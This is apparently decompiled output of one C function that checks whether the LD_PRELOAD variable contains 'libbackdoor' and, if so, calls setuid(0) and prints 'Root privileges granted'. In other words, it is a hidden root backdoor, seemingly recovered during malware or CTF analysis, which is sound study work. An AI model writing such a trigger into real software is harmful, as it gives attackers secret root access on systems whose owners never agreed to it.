
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

/* DISPLAY WARNING: Type casts are NOT being printed */

void privilege_escelation(void)

{
  char *env;
  char *dummy;
  
                    /* Get the enviorment from name LD_PRELOAD */
  env = getenv("LD_PRELOAD");
  if (env != 0x0) {
    env = strstr(env,"libbackdoor");
                    /* If the string libbackdoor exists, upgrade UID
                       to 0 (aka root). */
    if (env != 0x0) {
      setuid(0);
      puts("Root privileges granted");
    }
  }
  return;
}

